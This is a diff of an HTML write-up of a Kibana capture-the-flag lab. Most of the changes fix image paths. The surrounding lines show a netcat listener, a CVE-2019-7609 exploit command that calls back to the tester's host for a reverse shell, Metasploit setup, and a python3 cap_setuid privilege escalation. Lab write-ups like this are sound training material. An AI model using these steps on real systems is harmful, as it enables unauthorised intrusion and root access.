@@ -41,7 +41,7 @@
 
 <p>How to apply ?</p>
 
-<p><img src="./images/cf3a2e5dd2d551b8640a2d493f3ee36f.png" alt="" /></p>
+<p><img src="cf3a2e5dd2d551b8640a2d493f3ee36f.png" alt="" /></p>
 
 <h2>Reconnaissance</h2>
 
@@ -50,12 +50,12 @@
 
 <p>Unusual port number:</p>
 
-<p><img src="./images/e8a15745496651c4b5b275912f8c037d.png" alt="" /></p>
+<p><img src="e8a15745496651c4b5b275912f8c037d.png" alt="" /></p>
 
-<p><img src="./images/c449e8ca809ba166e891781ff3d6294a.png" alt="" /></p>
+<p><img src="c449e8ca809ba166e891781ff3d6294a.png" alt="" /></p>
 
 <p>What is Kibana ?
-<img src="./images/f63b01787e995edea417abe07af45384.png" alt="" /></p>
+<img src="f63b01787e995edea417abe07af45384.png" alt="" /></p>
 
 <p>Suspicious path:
 http://kiba.thm:5601/app/timelion#</p>
@@ -78,7 +78,7 @@ http://kiba.thm:5601/app/timelion#</p>
 
 <p>After a couple of research process, I discovered the vulnerability itself which is <strong>Prototype Pollusion</strong> on <strong>Timelion</strong> feature of the <strong>Kibana</strong> - ElasticSearch supported and opensource data visualization platform.</p>
 
-<p><img src="./images/729ac78be8e9db4f7c4fed3c058becbc.png" alt="" /></p>
+<p><img src="729ac78be8e9db4f7c4fed3c058becbc.png" alt="" /></p>
 
 <p>Initial compromise:
 - Used Payload:</p>
@@ -96,7 +96,7 @@ nc -lvnp 1337
 </ul>
 
 <p>Reverse Shell PoC:
-<img src="./images/c01fde4a727b62e56d674dae6346ddbf.png" alt="" /></p>
+<img src="c01fde4a727b62e56d674dae6346ddbf.png" alt="" /></p>
 
 <h3>Manual Exploitation - 2</h3>
 
@@ -126,9 +126,9 @@ python2 CVE-2019-7609-kibana-rce.py -u http://10.10.163.241:5601 -host 10.11.69.
 
 <p>However, it did not call back on my machine. After on my first shot, I got break-time and turn on hybrid mode on my system. Therefore, I am going to refresh the machine.</p>
 
-<p><img src="./images/d24a174170333ddd84070e2414595cc2.png" alt="" /></p>
+<p><img src="d24a174170333ddd84070e2414595cc2.png" alt="" /></p>
 
-<p><img src="./images/eaaad08b9760b6b943ea9af458e1c8cd.png" alt="" /></p>
+<p><img src="eaaad08b9760b6b943ea9af458e1c8cd.png" alt="" /></p>
 
 <p>Now it works ! After I restarted the machine, I was able to get my reverse shell !</p>
 
@@ -138,7 +138,7 @@ python2 CVE-2019-7609-kibana-rce.py -u http://10.10.163.241:5601 -host 10.11.69.
 
 <p><code>Metasploit Framework</code> offers only three modules for <strong>Kibana</strong> platform. However, first approach was suitable for me. You can reach out the related module in below.</p>
 
-<p><img src="./images/c59ebbaa12eec0413d0a11bff25962e1.png" alt="" /></p>
+<p><img src="c59ebbaa12eec0413d0a11bff25962e1.png" alt="" /></p>
 
 <p>To interact with correlated module:</p>
 
@@ -154,7 +154,7 @@ use 0
 show options
 </code></p>
 
-<p><img src="./images/c53a369d6204c98af36def3009c7b52d.png" alt="" /></p>
+<p><img src="c53a369d6204c98af36def3009c7b52d.png" alt="" /></p>
 
 <p>Modifying the <code>RHOSTS</code>, <code>TARGETURI</code> and <code>RPORT</code> is enough to execute our exploit.</p>
 
@@ -168,7 +168,7 @@ set [needed attribute]</p>
 
 <p>For this scenario, do not forget to modify <em>RHOSTS</em>, <em>LHOST</em> and <em>LPORT</em>.</p>
 
-<p><img src="./images/a20b149b5028537d238919c11e7979b7.png" alt="" /></p>
+<p><img src="a20b149b5028537d238919c11e7979b7.png" alt="" /></p>
 
 <p>Since I forgot to give <code>LHOST</code> and <code>LPORT</code> option, I was not able to run the script appropriately. That's why, do not forget to <code>set</code> them.</p>
 
@@ -205,9 +205,9 @@ chmod +x linpeas.sh
 <li><p>The crontab shows that the user Kiba has a cron job scheduled to run every minute. This job navigates to the directory /home/kiba/kibana/bin and runs the bash kibana command.</p></li>
 </ul>
 
-<p><img src="./images/1.png" alt="" /></p>
+<p><img src="TryHackMe/Kibana/images/1.PNG" alt="" /></p>
 
-<p><img src="./images/sudo.png" alt="" /></p>
+<p><img src="sudo.png" alt="" /></p>
 
 <p>We have a possible privilege escalation vector known as Sudo Privileges:</p>
 
@@ -224,11 +224,11 @@ chmod +x linpeas.sh
 
 <p>Furthermore, we have a binary named /home/kiba/.hackmeplease/python3, which has the capability cap_setuid+ep, which means that this Python binary can change user IDs (setuid). This is a potential privilege escalation vector since it allows the Python process to execute with elevated privileges.</p>
 
-<p><img src="./images/2.PNG" alt="" /></p>
+<p><img src="TryHackMe/Kibana/images/2.PNG" alt="" /></p>
 
 <p>Let me pay attention on .hackmeplease :D</p>
 
-<p><img src="./images/3.PNG" alt="" /></p>
+<p><img src="TryHackMe/Kibana/images/3.PNG" alt="" /></p>
 
 <p>Since we have the python3 binary and its vulnerability. In binary exploitation, we trust GFTOBins to escalate privileges:</p>
 
@@ -238,7 +238,7 @@ chmod +x linpeas.sh
 <li>On GFTOBins, we have many binaries available to elevate our privileges. However, today, we should look for Python binary. After a deep dive attempt, I recognized that I was dealing with cap_setuid+ep capability. Therefore, using this payload to escalate my privileges will be suitable.</li>
 </ul>
 
-<p><img src="./images/4.PNG" alt="alt text" /></p>
+<p><img src="TryHackMe/Kibana/images/4.PNG" alt="alt text" /></p>
 
 <ul>
 <li>You can execute following command to be <code>root</code> on target.</li>
